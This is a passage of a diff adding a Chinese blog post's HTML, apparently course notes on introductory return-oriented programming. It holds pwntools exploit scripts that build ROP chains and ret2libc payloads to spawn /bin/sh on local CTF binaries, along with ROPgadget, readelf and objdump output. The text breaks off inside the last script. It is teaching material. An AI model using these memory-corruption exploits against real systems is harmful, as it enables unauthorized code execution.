@@ -1,0 +1,1216 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next muse use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Pwn," />
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="Lhaihai's Blog" type="application/atom+xml" />
+
+
+
+
+
+
+<meta name="description" content="蓝鲸安全的PWN入门课程">
+<meta name="keywords" content="Pwn">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ROP入门">
+<meta property="og:url" content="http://blog.Lhaihai.wang/2018/08/24/ROP入门/index.html">
+<meta property="og:site_name" content="Lhaihai&#39;s Blog">
+<meta property="og:description" content="蓝鲸安全的PWN入门课程">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/PWN/ROP.assets/1534848989362.png">
+<meta property="og:image" content="https://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/PWN/ROP.assets/1534848975573.png">
+<meta property="og:image" content="https://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/PWN/ROP.assets/1534953910131.png">
+<meta property="og:image" content="https://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/PWN/ROP.assets/1534953935732.png">
+<meta property="og:updated_time" content="2018-08-23T17:17:19.616Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="ROP入门">
+<meta name="twitter:description" content="蓝鲸安全的PWN入门课程">
+<meta name="twitter:image" content="https://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/PWN/ROP.assets/1534848989362.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://blog.Lhaihai.wang/2018/08/24/ROP入门/"/>
+
+
+
+
+
+  <title>ROP入门 | Lhaihai's Blog</title>
+  
+
+
+
+
+<script>
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+            (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+          m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+  ga('create', 'UA-117483741-1', 'auto');
+  ga('send', 'pageview');
+</script>
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+  
+  <script type="text/javascript" color="0,0,255" opacity='0.7' zIndex="-2" count="10" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script>
+ 
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+  <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Lhaihai's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />
+            
+            搜索
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off"
+             placeholder="搜索..." spellcheck="false"
+             type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://blog.Lhaihai.wang/2018/08/24/ROP入门/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Lhaihai">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Lhaihai's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">ROP入门</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-08-24T01:14:04+08:00">
+                2018-08-24
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Pwn/" itemprop="url" rel="index">
+                    <span itemprop="name">Pwn</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+            <span class="post-meta-divider">|</span>
+            <span class="page-pv"><i class="fa fa-file-o">本文总阅读量</i>
+            <span class="busuanzi-value" id="busuanzi_value_page_pv" ></span>次
+            </span>
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>蓝鲸安全的PWN入门课程</p>
+<a id="more"></a>
+<h2 id="Rop-一"><a href="#Rop-一" class="headerlink" title="Rop(一)"></a>Rop(一)</h2><p>查找ROP</p>
+<p>ROPGadget</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary ./shellcode</span><br><span class="line">ROPgadget --binary shellcode --opcode cd80c3</span><br><span class="line">cd80c3 //int 0x80 ; ret</span><br></pre></td></tr></table></figure>
+<p>查找可以写入的代码段</p>
+<p><img src="https://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/PWN/ROP.assets/1534848989362.png" alt="1534848989362"></p>
+<p><img src="https://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/PWN/ROP.assets/1534848975573.png" alt="1534848975573"></p>
+<p>查找int 80 ，发现没有 int 80 ； ret</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">nick@nick-machine:~/Pwnrumen$ ROPgadget --binary ./rop --opcode cd80c3</span><br><span class="line">Opcodes information</span><br><span class="line">============================================================</span><br><span class="line">0x0806ef00 : cd80c3</span><br></pre></td></tr></table></figure>
+<table>
+<thead>
+<tr>
+<th><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/read.2.html" target="_blank" rel="noopener">sys_read</a></th>
+<th>0x03</th>
+<th>unsigned int fd</th>
+<th>char __user *buf</th>
+<th>size_t count</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/execve.2.html" target="_blank" rel="noopener"> sys_execve</a></td>
+<td>0x0b</td>
+<td>char __user *</td>
+<td>char <strong>user *</strong>user *</td>
+<td>char <strong>user *</strong>user *</td>
+</tr>
+</tbody>
+</table>
+<h3 id="rop"><a href="#rop" class="headerlink" title="rop"></a>rop</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">conn = remote(<span class="string">'127.0.0.1'</span>,<span class="string">'4000'</span>)</span><br><span class="line"></span><br><span class="line">pop_eax_ret = <span class="number">0x080b90f6</span></span><br><span class="line">pop_ebx_ret = <span class="number">0x080481c9</span></span><br><span class="line">pop_ecx_ret = <span class="number">0x080595b3</span></span><br><span class="line">pop_edx_ret = <span class="number">0x0806e7da</span></span><br><span class="line">buf = <span class="number">0x080ee000</span> - <span class="number">100</span></span><br><span class="line">int_80_ret = <span class="number">0x0806ef00</span></span><br><span class="line"></span><br><span class="line">rop = [</span><br><span class="line">	pop_eax_ret,</span><br><span class="line">	<span class="number">0x03</span>,</span><br><span class="line">	pop_ebx_ret,</span><br><span class="line">	<span class="number">0</span>,</span><br><span class="line">	pop_ecx_ret,</span><br><span class="line">	buf,</span><br><span class="line">	pop_edx_ret,</span><br><span class="line">	<span class="number">50</span>,</span><br><span class="line">	int_80_ret,</span><br><span class="line">	pop_eax_ret,</span><br><span class="line">	<span class="number">0x0b</span>,</span><br><span class="line">	pop_ebx_ret,</span><br><span class="line">	buf,</span><br><span class="line">	pop_ecx_ret,</span><br><span class="line">	<span class="number">0</span>,</span><br><span class="line">	pop_edx_ret,</span><br><span class="line">	<span class="number">0</span>,</span><br><span class="line">	int_80_ret,</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">22</span>+flat(rop)</span><br><span class="line"></span><br><span class="line">conn.sendline(payload)</span><br><span class="line">sleep(<span class="number">2</span>)</span><br><span class="line">conn.sendline(<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line"></span><br><span class="line">conn.interactive()</span><br></pre></td></tr></table></figure>
+<h3 id="simplerop"><a href="#simplerop" class="headerlink" title="simplerop"></a>simplerop</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">conn = remote(<span class="string">'127.0.0.1'</span>,<span class="string">'4000'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pop_eax_ret = <span class="number">0x080bae06</span></span><br><span class="line">pop_edx_ecx_ebx_ret = <span class="number">0x0806e850</span></span><br><span class="line"></span><br><span class="line">buf = <span class="number">0x080eb000</span><span class="number">-100</span></span><br><span class="line">int_0x80_ret = <span class="number">0x0806eef0</span></span><br><span class="line"></span><br><span class="line">rop = [</span><br><span class="line">	pop_eax_ret,</span><br><span class="line">	<span class="number">0x03</span>,</span><br><span class="line">	pop_edx_ecx_ebx_ret,</span><br><span class="line">	<span class="number">50</span>,</span><br><span class="line">	buf,</span><br><span class="line">	<span class="number">0</span>,</span><br><span class="line">	int_0x80_ret,</span><br><span class="line">	pop_eax_ret,</span><br><span class="line">	<span class="number">0x0b</span>,</span><br><span class="line">	pop_edx_ecx_ebx_ret,</span><br><span class="line">	<span class="number">0</span>,</span><br><span class="line">	<span class="number">0</span>,</span><br><span class="line">	buf,</span><br><span class="line">	int_0x80_ret,</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">32</span> + flat(rop)</span><br><span class="line"></span><br><span class="line">r = conn.recvline()</span><br><span class="line"></span><br><span class="line">r = conn.recvuntil(<span class="string">'Your input :'</span>)</span><br><span class="line"></span><br><span class="line">conn.sendline(payload)</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">conn.sendline(<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line"></span><br><span class="line">conn.interactive()</span><br></pre></td></tr></table></figure>
+<p>ROP：<a href="https://speakerdeck.com/l4ys/rop-qing-song-tan" target="_blank" rel="noopener">ROP轻松谈</a> </p>
+<h2 id="ROP（二）"><a href="#ROP（二）" class="headerlink" title="ROP（二）"></a>ROP（二）</h2><h3 id="ret2libc"><a href="#ret2libc" class="headerlink" title="ret2libc"></a>ret2libc</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">nick@nick-machine:~$ readelf -a /lib32/libc-2.19.so | grep puts@</span><br><span class="line">   203: 00064da0   421 FUNC    GLOBAL DEFAULT   12 _IO_puts@@GLIBC_2.0</span><br><span class="line">   430: 00064da0   421 FUNC    WEAK   DEFAULT   12 puts@@GLIBC_2.0</span><br><span class="line">  1173: 00063830   325 FUNC    WEAK   DEFAULT   12 fputs@@GLIBC_2.0</span><br><span class="line">  1723: 00063830   325 FUNC    GLOBAL DEFAULT   12 _IO_fputs@@GLIBC_2.0</span><br><span class="line">nick@nick-machine:~$ readelf -a /lib32/libc-2.19.so | grep gets@</span><br><span class="line">    96: 00064440   365 FUNC    WEAK   DEFAULT   12 gets@@GLIBC_2.0</span><br><span class="line">   800: 000632a0   354 FUNC    WEAK   DEFAULT   12 fgets@@GLIBC_2.0</span><br><span class="line">  1374: 000632a0   354 FUNC    GLOBAL DEFAULT   12 _IO_fgets@@GLIBC_2.0</span><br><span class="line">  1799: 0002ce40   204 FUNC    GLOBAL DEFAULT   12 catgets@@GLIBC_2.0</span><br><span class="line">  2249: 00064440   365 FUNC    GLOBAL DEFAULT   12 _IO_gets@@GLIBC_2.0</span><br><span class="line">nick@nick-machine:~$ readelf -a /lib32/libc-2.19.so | grep system@</span><br><span class="line">   620: 0003fe70    56 FUNC    GLOBAL DEFAULT   12 __libc_system@@GLIBC_PRIVATE</span><br><span class="line">  1443: 0003fe70    56 FUNC    WEAK   DEFAULT   12 system@@GLIBC_2.0</span><br></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">conn = remote(<span class="string">'127.0.0.1'</span>,<span class="string">'4000'</span>)</span><br><span class="line"></span><br><span class="line">puts_got_plt = <span class="number">0x0804a01c</span></span><br><span class="line">puts_off = <span class="number">0x0064da0</span></span><br><span class="line"></span><br><span class="line">conn.recvuntil(<span class="string">":"</span>)</span><br><span class="line">conn.sendline(str(puts_got_plt))</span><br><span class="line">conn.recvuntil(<span class="string">":"</span>)</span><br><span class="line">libc_base = int(conn.recvuntil(<span class="string">'\n'</span>).strip(),<span class="number">16</span>) - puts_off</span><br><span class="line"><span class="keyword">print</span> hex(libc_base)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">gets = libc_base + <span class="number">0x00064440</span></span><br><span class="line">system = libc_base + <span class="number">0x0003fe70</span></span><br><span class="line">buf = <span class="number">0x0804b000</span> - <span class="number">30</span></span><br><span class="line"></span><br><span class="line">rop = [</span><br><span class="line">	gets,</span><br><span class="line">	system,</span><br><span class="line">	buf,</span><br><span class="line">	buf,</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">conn.recvuntil(<span class="string">':'</span>)</span><br><span class="line">conn.sendline(<span class="string">'a'</span>*<span class="number">60</span>+flat(rop))</span><br><span class="line">sleep(<span class="number">2</span>)</span><br><span class="line">conn.sendline(<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line">raw_input(<span class="string">'#'</span>)</span><br><span class="line"></span><br><span class="line">conn.interactive()</span><br></pre></td></tr></table></figure>
+<h3 id="pwnme"><a href="#pwnme" class="headerlink" title="pwnme"></a>pwnme</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">nick@nick-machine:~/Pwnrumen/pwnme$ objdump -d -j .plt ./pwnme</span><br><span class="line"></span><br><span class="line">./pwnme:     file format elf32-i386</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Disassembly of section .plt:</span><br><span class="line"></span><br><span class="line">08048320 &lt;read@plt-0x10&gt;:</span><br><span class="line"> 8048320:	ff 35 04 a0 04 08    	pushl  0x804a004</span><br><span class="line"> 8048326:	ff 25 08 a0 04 08    	jmp    *0x804a008</span><br><span class="line"> 804832c:	00 00                	add    %al,(%eax)</span><br><span class="line">	...</span><br><span class="line"></span><br><span class="line">08048330 &lt;read@plt&gt;:</span><br><span class="line"> 8048330:	ff 25 0c a0 04 08    	jmp    *0x804a00c</span><br><span class="line"> 8048336:	68 00 00 00 00       	push   $0x0</span><br><span class="line"> 804833b:	e9 e0 ff ff ff       	jmp    8048320 &lt;read@plt-0x10&gt;</span><br><span class="line"></span><br><span class="line">08048340 &lt;alarm@plt&gt;:</span><br><span class="line"> 8048340:	ff 25 10 a0 04 08    	jmp    *0x804a010</span><br><span class="line"> 8048346:	68 08 00 00 00       	push   $0x8</span><br><span class="line"> 804834b:	e9 d0 ff ff ff       	jmp    8048320 &lt;read@plt-0x10&gt;</span><br><span class="line"></span><br><span class="line">08048350 &lt;__gmon_start__@plt&gt;:</span><br><span class="line"> 8048350:	ff 25 14 a0 04 08    	jmp    *0x804a014</span><br><span class="line"> 8048356:	68 10 00 00 00       	push   $0x10</span><br><span class="line"> 804835b:	e9 c0 ff ff ff       	jmp    8048320 &lt;read@plt-0x10&gt;</span><br><span class="line"></span><br><span class="line">08048360 &lt;__libc_start_main@plt&gt;:</span><br><span class="line"> 8048360:	ff 25 18 a0 04 08    	jmp    *0x804a018</span><br><span class="line"> 8048366:	68 18 00 00 00       	push   $0x18</span><br><span class="line"> 804836b:	e9 b0 ff ff ff       	jmp    8048320 &lt;read@plt-0x10&gt;</span><br><span class="line"></span><br><span class="line">08048370 &lt;write@plt&gt;:</span><br><span class="line"> 8048370:	ff 25 1c a0 04 08    	jmp    *0x804a01c</span><br><span class="line"> 8048376:	68 20 00 00 00       	push   $0x20</span><br><span class="line"> 804837b:	e9 a0 ff ff ff       	jmp    8048320 &lt;read@plt-0x10&gt;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ x/5s *0x804a018</span><br><span class="line">0xf7e2c9e0:	&quot;UWVS\350\&quot;\241\020&quot;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">nick@nick-machine:~/Pwnrumen/pwnme$ readelf -a /lib32/libc-2.19.so | grep main@</span><br><span class="line">  1776: 0002b8d0   296 FUNC    WEAK   DEFAULT   12 textdomain@@GLIBC_2.0</span><br><span class="line">  2200: 000280f0    50 FUNC    WEAK   DEFAULT   12 bindtextdomain@@GLIBC_2.0</span><br><span class="line">  2262: 000199e0   454 FUNC    GLOBAL DEFAULT   12 __libc_start_main@@GLIBC_2.0</span><br><span class="line">nick@nick-machine:~/Pwnrumen/pwnme$ readelf -a /lib32/libc-2.19.so | grep gets@</span><br><span class="line">    96: 00064440   365 FUNC    WEAK   DEFAULT   12 gets@@GLIBC_2.0</span><br><span class="line">   800: 000632a0   354 FUNC    WEAK   DEFAULT   12 fgets@@GLIBC_2.0</span><br><span class="line">  1374: 000632a0   354 FUNC    GLOBAL DEFAULT   12 _IO_fgets@@GLIBC_2.0</span><br><span class="line">  1799: 0002ce40   204 FUNC    GLOBAL DEFAULT   12 catgets@@GLIBC_2.0</span><br><span class="line">  2249: 00064440   365 FUNC    GLOBAL DEFAULT   12 _IO_gets@@GLIBC_2.0</span><br><span class="line">nick@nick-machine:~/Pwnrumen/pwnme$ readelf -a /lib32/libc-2.19.so | grep system@</span><br><span class="line">   620: 0003fe70    56 FUNC    GLOBAL DEFAULT   12 __libc_system@@GLIBC_PRIVATE</span><br><span class="line">  1443: 0003fe70    56 FUNC    WEAK   DEFAULT   12 system@@GLIBC_2.0</span><br></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </span><br><span class="line"></span><br><span class="line">conn = remote(<span class="string">'127.0.0.1'</span>,<span class="string">'4000'</span>)</span><br><span class="line"></span><br><span class="line">p = ELF(<span class="string">'./pwnme'</span>)</span><br><span class="line">libc = ELF(<span class="string">'/lib32/libc.so.6'</span>)</span><br><span class="line"></span><br><span class="line">plt_write = p.symbols[<span class="string">'write'</span>]</span><br><span class="line">got_write = p.got[<span class="string">'write'</span>]</span><br><span class="line">read = p.symbols[<span class="string">'read'</span>]</span><br><span class="line"></span><br><span class="line">write_off = libc.symbols[<span class="string">'write'</span>]</span><br><span class="line"></span><br><span class="line">libc_base = <span class="number">0xf66ee900</span> - write_off</span><br><span class="line"><span class="comment">#0xf6615000</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">'libc_base'</span>+hex(libc_base)</span><br><span class="line"></span><br><span class="line">gets_off = libc.symbols[<span class="string">'gets'</span>]</span><br><span class="line">system_off = libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">gets = libc_base + gets_off</span><br><span class="line">system = libc_base + system_off</span><br><span class="line"><span class="keyword">print</span> <span class="string">'gets'</span>+hex(gets)</span><br><span class="line"><span class="keyword">print</span> <span class="string">'system'</span>+hex(system)</span><br><span class="line">buf = <span class="number">0x0804b000</span> <span class="number">-100</span></span><br><span class="line"></span><br><span 